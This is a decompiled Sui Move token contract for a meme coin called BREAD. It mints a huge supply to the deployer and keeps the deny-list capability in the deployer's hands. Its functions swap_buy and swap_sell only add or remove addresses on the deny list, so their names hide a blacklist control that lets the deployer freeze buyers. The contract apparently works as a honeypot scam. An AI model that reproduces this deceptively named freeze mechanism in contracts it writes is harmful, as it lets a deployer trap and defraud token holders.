module 0x25fb063245d0a097209167669b068cd71a4f03b9f666b444752694e4ac9889f2::bread {
    struct BREAD has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BREAD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BREAD>(arg0, 9, b"BREAD", b"Just a Bread", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmW7XCurCMNzwdTGyEBruYAiJ5rhUxq5tBBxZJTQLqzjsZ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BREAD>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BREAD>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BREAD>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BREAD>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BREAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BREAD>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BREAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BREAD>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

